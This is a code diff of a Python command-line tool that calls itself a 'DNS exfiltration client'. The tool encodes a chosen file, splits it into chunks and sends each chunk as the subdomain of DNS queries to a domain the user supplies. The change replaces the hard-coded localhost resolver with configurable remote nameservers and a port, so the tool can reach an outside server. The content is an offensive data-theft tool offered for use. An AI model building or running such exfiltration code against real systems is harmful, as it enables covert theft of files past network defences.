@@ -17,8 +17,9 @@ def main(file_path):
     chunks = chunk_data(encoded_data, chunk_size)
 
     resolver = dns.resolver.Resolver()
-    resolver.nameservers = ['127.0.0.1']
-    resolver.port = 5053
+    # resolver.nameservers = ['127.0.0.1']
+    resolver.nameservers = args.nameservers.split(',')
+    resolver.port = args.port
 
     for i, chunk in enumerate(chunks):
         QFDN = f"{i}-{chunk}.{args.domain}"
@@ -30,7 +31,9 @@ def main(file_path):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="DNS exfiltration client.")
     parser.add_argument("-f", "--file", required=True, help="Path to the file to exfiltrate.")
+    parser.add_argument("--nameservers", default="127.0.0.1", help="Comma-separated list of nameservers, Server (IP/Hostname). Default is '127.0.0.1'.")
     parser.add_argument("-d", "--domain", required=True, help="Doamin to query data with it. ex:google.com")
+    parser.add_argument("-p", "--port", type=int, default=53, help="Server listening port.")
     args = parser.parse_args()
 
     main(args.file)
